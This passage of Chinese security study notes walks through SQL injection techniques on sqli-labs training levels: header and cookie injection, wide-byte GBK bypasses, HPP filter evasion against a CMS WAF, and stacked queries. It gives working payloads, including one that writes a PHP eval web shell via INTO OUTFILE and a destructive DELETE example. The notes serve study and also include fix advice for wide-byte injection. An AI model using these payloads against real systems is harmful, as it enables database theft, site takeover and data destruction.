data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311173048631.png\" alt=\"image-20220311173048631\"></p>\n<p>0. 数据库中闭合语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>\n<p>最终 payload 有两种形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1),&#x27;127.0.0.1&#x27;,&#x27;sb&#x27;)#</span><br><span class=\"line\">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">//注意不能直接使用#注释，否则会产生括号不匹配，要是用#必须手动加后半个括号补齐</span><br><span class=\"line\">//但加如)后会导致列数不匹配,后面还需要补充两列</span><br></pre></td></tr></table></figure>\n<p>也可以使用 sqlmap 注入，但要注意默认的等级 level1 是不对 uagent 检测的</p>\n<h5 id=\"cookie注入\"><a class=\"markdownIt-Anchor\" href=\"#cookie注入\">#</a> cookie 注入</h5>\n<p>通过没有过滤 cookie 字段的值产生的 cookie 注入</p>\n<p>sqllab pass-20，21，22</p>\n<p>注意在抓包时需要先和服务器进行一次交互，使得服务器返回 cookie。只有提交正确的用户名和密码才能到 if 中 setcookie</p>\n<p>后续在第二个包中注入，没有设置 submit 时会进第二个 if 走 select 查询</p>\n<p>验证存在注入：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311175929845.png\" alt=\"image-20220311175929845\"></p>\n<p>进行注入：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220311180121906.png\" alt=\"image-20220311180121906\"></p>\n<p>最终构造的 paylaod 为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) #</span><br><span class=\"line\">Cookie: uname=admin&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>不加 <code>)</code>  的原因是他的查询语句长这样：</p>\n<p>​      <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mi>S</mi><mi>E</mi><mi>L</mi><mi>E</mi><mi>C</mi><mi>T</mi><mo>∗</mo><mi>F</mi><mi>R</mi><mi>O</mi><mi>M</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>W</mi><mi>H</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup></mrow><annotation encoding=\"application/x-tex\">sql=&quot;SELECT * FROM users WHERE username=&#x27;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span>cookee’ LIMIT 0,1&quot;;</p>\n<p>你只需要闭合 <code>'</code>  不再需要闭合 <code>)</code></p>\n<h5 id=\"post注入\"><a class=\"markdownIt-Anchor\" href=\"#post注入\">#</a> post 注入</h5>\n<p>通过 post 提交的参数中注入</p>\n<p>postman,hackbar,burpsuite 可以提交 post 参数</p>\n<p>sqllabs less11  - less14</p>\n<p>sqli - less11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=-1&#x27; union select 1,2#&amp;passws=1111</span><br></pre></td></tr></table></figure>\n<p>sqlmap 两种形式</p>\n<p>1. 将 http 请求包放入 txt 中</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 1.txt</p>\n<p>2.sqlmap -u URL --data “”</p>\n<h5 id=\"sql读写文件注入\"><a class=\"markdownIt-Anchor\" href=\"#sql读写文件注入\">#</a> SQL 读写文件注入</h5>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select into outfile  导出数据</span><br><span class=\"line\">?id=-1&#x27; union select &lt;?php eval($_POST[&#x27;C&#x27;]);?&gt; into outfile E:/web.php</span><br><span class=\"line\"></span><br><span class=\"line\">outfile 导出条件</span><br><span class=\"line\">root权限</span><br><span class=\"line\">GPC关闭（能使用单引号)</span><br><span class=\"line\">有绝对路径（读文件可以不用，写文件必须)</span><br><span class=\"line\">没有配置-secure-file-priv 通过my.ini配置为空   secure-file-priv=&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">?id=-1&#x27;)) union select 1,&quot;&lt;?php phpinfo();?&gt;&quot;,3 into outfile &#x27;网站物理路径&#x27; --+</span><br><span class=\"line\">less-7/demo.php</span><br><span class=\"line\">?id=1&#x27;)) union select 1,2, &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; into outfile &quot;D:/Phpstudy/PHPTutorial/test1.php --+</span><br><span class=\"line\">写马的时候必须使用字符串</span><br></pre></td></tr></table></figure>\n<h5 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h5>\n<p>导致原因： <code>mysql_query(&quot;set names gbk&quot;)</code>  错误使用了编码方式 <code>gbk</code></p>\n<p>一个 <code>gbk</code>  编码汉字，占用 2 个字节。一个 <code>utf-8</code>  编码的汉字，占用 3 个字节。</p>\n<p>假设我们有以下代码，并且我们的 <code>magic_quotes_gpc</code>  是关闭的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span><br><span class=\"line\">$conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;toor!@#$&#x27;) or die(&#x27;bad!&#x27;);</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_select_db(&#x27;test&#x27;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class=\"line\">//执行sql语句</span><br><span class=\"line\">$id = isset($_GET[&#x27;id&#x27;]) ? addslashes($_GET[&#x27;id&#x27;]) : 1;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM news WHERE tid=&#x27;&#123;$id&#125;&#x27;&quot;;</span><br><span class=\"line\">$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class=\"line\">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class=\"line\">echo &quot;&lt;h2&gt;&#123;$row[&#x27;title&#x27;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&#x27;content&#x27;]&#125;&lt;p&gt;\\n&quot;;</span><br><span class=\"line\">mysql_free_result($result);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>如果我们想注入，那么必须绕过 <code>addslashes</code>  的过滤，我们可以有两种思路：</p>\n<blockquote>\n<p>1. 想办法给 <code>\\</code>  前面再加一个 <code>\\</code> （或单数个即可），变成 <code>\\\\'</code> ，这样 <code>\\</code>  被转义了， <code>'</code>  逃出了限制</p>\n<p>2. 想办法把 <code>\\</code>  弄没有。</p>\n</blockquote>\n<p>我们先说把 <code>\\</code>  弄没有的情况</p>\n<p>mysql 在使用 GBK 编码的时候，会认为两个字符是一个汉字（前一个 ascii 码要大于 128，才到汉字的范围）。如果我们输入 <code>%df'</code>  看会怎样：</p>\n<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111ß\\''' at line 1</code></p>\n<p>此时出现报错，说明存在注入</p>\n<p>这就是 mysql 的特性，因为 <code>gbk</code>  是多字节编码，他认为两个字节代表一个汉字，所以 <code>%df</code>  和后面的 <code>addslash</code>  加的 <code>\\</code>  也就是 <code>%5c</code>  变成了一个汉字 <code>運</code> ，而 <code>'</code>  逃逸了出来。</p>\n<p>因为两个字节代表一个汉字，所以我们可以试试 <code>%df%df%27</code> ：</p>\n<p>此时不报错了， <code>%df%df</code>  拼成了一个汉字， <code>%5c%27</code>  因为 <code>27</code>  不大于 128，不构成汉字。所以根据这个特性，我们用 <code>1%a1'</code>  也可以。</p>\n<p><code>%a1%5c</code>  他可能不是汉字，但一定会被 mysql 认为是一个宽字符，就能够让后面的 <code>%27</code>  逃逸了出来。</p>\n<p>但如果我们把 gbk 换成 gb2312，我们的 <code>%df%5c%27</code>  又不能注入了</p>\n<p>这归结于 gb2312 编码的取值范围。它的高位范围是 <code>0xA1~0xF7</code> ，低位范围是 <code>0xA1~0xFE</code> ，而 <code>\\</code>  是 0x5c，是不在低位范围中的。所以， <code>0x5c</code>  根本不是 gb2312 中的编码，所以自然也是不会被吃掉的。</p>\n<p>为了解决宽字节注入，有些 cms 会用 mysql_real_escape_string 抵御，但如果我们去使用 % df，他依然会被打穿</p>\n<p>原因就是，你没有指定 php 连接 mysql 的字符集。我们需要在执行 sql 语句之前调用一下 mysql_set_charset 函数，设置当前连接的字符集为 gbk。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案1</span><br><span class=\"line\">mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;);</span><br><span class=\"line\">mysql_real_escape_string</span><br></pre></td></tr></table></figure>\n<p>第二个解决方案就是，将 character_set_client 设置为 binary（二进制）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修复方案2</span><br><span class=\"line\">//只需在所有sql语句前指定一下连接的形式是二进制：</span><br><span class=\"line\">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>\n<p>我们将 character_set_client 设置成 binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>\n<p>接下来是双重转义的情况 —iconv 导致的致命后果</p>\n<p>(划重点，好好看，后面 file include 中会考这个函数)</p>\n<p>有些 cms 会使用如下字符集转换函数防止乱码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;utf-8&#x27;, &#x27;gbk&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>当我们输入 <code>錦'</code>  时，他又报错了，它的 utf-8 编码是 <code>0xe98ca6</code> ，它的 gbk 编码是 <code>0xe55c</code></p>\n<p>当他从 utf8 转成 gbk 时，变成了 <code>%e5%5c%27</code> ，这时多管闲事的 addslashes 又送来了一个 <code>\\</code> ，变成了 <code>%e5%5c%5c%27</code> ，两个 5c 形成了双重转义，对 <code>'</code>  的转义失效，注入产生</p>\n<p>如果我们此时从 gbk 转为 utf8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iconv(&#x27;gbk&#x27;, &#x27;utf-8&#x27;, $_GET[&#x27;word&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>我们再次输入 <code>%aa'</code> ，注入又发生了，因为从 gbk 转为 utf8 时，php 会两个字节一转换，一旦 <code>\\</code>  前面的字符是奇数， <code>\\</code>  就会被吞掉， <code>'</code>  逃逸</p>\n<p>那么为什么之前 utf-8 转换成 gbk 的时候，没有使用这个姿势？</p>\n<p>对于多字节的符号，其第 2、3、4 字节的前两位都是 10，也就是说， <code>\\</code> （0x0000005c）不会出现在 utf-8 编码中，所以 utf-8 转换成 gbk 时，如果有 <code>\\</code>  则 php 会报错：</p>\n<p>而 <code>\\</code>  会出现在 gbk 中，所以从 gbk 转为 utf8 会吞掉 \\</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vbXV0aWJ5dGUtc3FsLWluamVjdC5odG1s\">浅析白盒审计中的字符编码及 SQL 注入 | 离别歌 (leavesongs.com)</span></p>\n<p>sqllab less-32</p>\n<p>注意：使用 post 提交时，不能自动转为 %5c，需要使用 BP 抓包提交</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316223957869.png\" alt=\"image-20220316223957869\"></p>\n<h5 id=\"hpp参数污染\"><a class=\"markdownIt-Anchor\" href=\"#hpp参数污染\">#</a> HPP 参数污染</h5>\n<p>sqllabs less 29:</p>\n<p>在 login.php 中，如果我们尝试闭合会产生报错，这关考点是 hpp 参数污染</p>\n<p>对于当有多个 key 相同的参数时，不同服务器获取参数与情况</p>\n<p>?id=1&amp;id=10</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220316200748174.png\" alt=\"image-20220316200748174\"></p>\n<p><strong>php 对于两个相同 key 的参数，取第二个</strong></p>\n<p>因此由于我们的环境是 php+Apache，只会接收第二个参数，我们只需要在第二个参数中注入，第一个参数可以随意提交，但 waf 过滤的却是第一个参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:18888/sqli/Less-29/login.php?id=1&amp;id=-2%27%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"通过hppphp绕过贷齐乐waf\"><a class=\"markdownIt-Anchor\" href=\"#通过hppphp绕过贷齐乐waf\">#</a> 通过 HPP+PHP 绕过贷齐乐 waf</h6>\n<p>此处的 waf 会经过两层过滤，第一层过滤</p>\n<p>/core/sqlin.inc.php，包含在 config.inc.php 中，所有请求都会经由此类过滤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class sqlin &#123;</span><br><span class=\"line\">\tfunction dowith_sql($str) &#123;</span><br><span class=\"line\">\t\t$check= eregi(&#x27;select|insert|update|delete|\\&#x27;|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile&#x27;, $str);</span><br><span class=\"line\">\t\tif($check)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\techo &quot;非法字符!&quot;;</span><br><span class=\"line\">\t\t\texit();</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>第二层过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* 检查和转义字符 */</span><br><span class=\"line\">function safe_str($str)&#123;</span><br><span class=\"line\">    if(!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">        if( is_array($str) ) &#123;</span><br><span class=\"line\">            foreach($str as $key =&gt; $value) &#123;</span><br><span class=\"line\">                $str[$key] = safe_str($value);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $str = addslashes($str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function dhtmlspecialchars($string) &#123;</span><br><span class=\"line\">    if(is_array($string)) &#123;</span><br><span class=\"line\">        foreach($string as $key =&gt; $val) &#123;</span><br><span class=\"line\">            $string[$key] = dhtmlspecialchars($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        $string = str_replace(array(&#x27;&amp;&#x27;, &#x27;&quot;&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;,&#x27;(&#x27;,&#x27;)&#x27;), array(&#x27;&amp;amp;&#x27;, &#x27;&amp;quot;&#x27;, &#x27;&amp;lt;&#x27;, &#x27;&amp;gt;&#x27;,&#x27;（&#x27;,&#x27;）&#x27;), $string);</span><br><span class=\"line\">        if(strpos($string, &#x27;&amp;amp;#&#x27;) !== false) &#123;</span><br><span class=\"line\">            $string = preg_replace(&#x27;/&amp;amp;((#(\\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/&#x27;, &#x27;&amp;\\\\1&#x27;, $string);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $string;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>因此该系统对于输入处理的过程如下</p>\n<p>index.php -&gt; config.inc.php -&gt; sqlin.php -&gt; safe.inc.php</p>\n<p>但我在 safe.inc.php 里找到了如下一段代码（在替换之前）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$request_uri = explode(&quot;?&quot;, $_SERVER[&#x27;REQUEST_URI&#x27;]);</span><br><span class=\"line\">if (isset($request_uri[1])) &#123;</span><br><span class=\"line\">\t$rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);</span><br><span class=\"line\">\tforeach ($rewrite_url as $key =&gt; $value) &#123;</span><br><span class=\"line\">\t\t$_value = explode(&quot;=&quot;, $value);</span><br><span class=\"line\">\t\tif (isset($_value[1])) &#123;</span><br><span class=\"line\">\t\t\t$_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = addslashes($_value[1]);</span><br><span class=\"line\">\t\t\t//$_REQUEST[$_value[0]] = dhtmlspecialchars($_value[1]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要内容就是通过 explode 的多次分割，将最后的 key-value 提取出来，在使用 dhtmlspecialchars 做一个转义</p>\n<p>当我们有两个相同参数时，php 是只取后一个的，假设我有一个办法，在第一次 WAF 检测参数的时候，检测的是 2，但后面覆盖 request 的时候，拿到的是 1，那么我们就可以绕过 waf</p>\n<p>但 php 的另一个特性：</p>\n<p>** 对于传入的非法的 $_GET 数组参数名，PHP 会将他们替换成下划线。** 经过 fuzz，有以下这些字符:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+ . _ [ &#x27; &#x27;</span><br></pre></td></tr></table></figure>\n<p>也就是说，php 会认为 i_d 和 i.d 是同一个参数</p>\n<p>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php 先将 user.id 转换成 user_id，即为 /t.php?user_id=11111&amp;user_id=22222 ，再获取到的 $_REQUEST [‘user_id’] 就是 22222。</p>\n<p>通过 $_SERVER [‘REQUEST_URI’] 方式获得的参数，并不会对参数中的某些特殊字符进行替换。</p>\n<p>因此在\\_SERVER\\['REQUEST\\_URI'\\]中，user\\_id和user\\.id却是两个完全不同的参数名，那么切割覆盖后，获取的_REQUEST [‘user_id’] 却是 11111。</p>\n<p>如果我们要利用这个特性，那么必须满足几点：</p>\n<p>1. 有注入点</p>\n<p>2. 注入点可控变量需要获取自 $_REQUEST</p>\n<p>3. 变量的名字必须包含下划线</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static function GetOne($data = array())&#123;</span><br><span class=\"line\">    global $mysql;</span><br><span class=\"line\">    $user_id = isset($data[&#x27;user_id&#x27;])?$data[&#x27;user_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $username = isset($data[&#x27;username&#x27;])?$data[&#x27;username&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $password = isset($data[&#x27;password&#x27;])?$data[&#x27;password&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $email = isset($data[&#x27;email&#x27;])?$data[&#x27;email&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $type_id = isset($data[&#x27;type_id&#x27;])?$data[&#x27;type_id&#x27;]:&quot;&quot;;</span><br><span class=\"line\">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class=\"line\">         `user_id` int(11) NOT NULL DEFAULT &#x27;0&#x27;)&quot;;</span><br><span class=\"line\">    $mysql -&gt;db_query($sql);</span><br></pre></td></tr></table></figure>\n<p>以上代码满足了上面的三个要求</p>\n<p>最终 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//由于=被过滤，需要使用like，同时对数据库进行16进制编码</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,flag,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br><span class=\"line\">?user_id=-1/**/Union/**/SeLect/**/1,schema_name from information_schema.schemata,3,4/**/from/**/users/**/limit/**/0,1&amp;user.id=11</span><br></pre></td></tr></table></figure>\n<h5 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h5>\n<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>\n<p>堆叠注入原理</p>\n<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>\n<p>堆叠注入的使用条件十分有限，其可能受到 API 或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条 sql 语句时才能够使用，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限.</p>\n<p>以 sqllab less-38 举例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 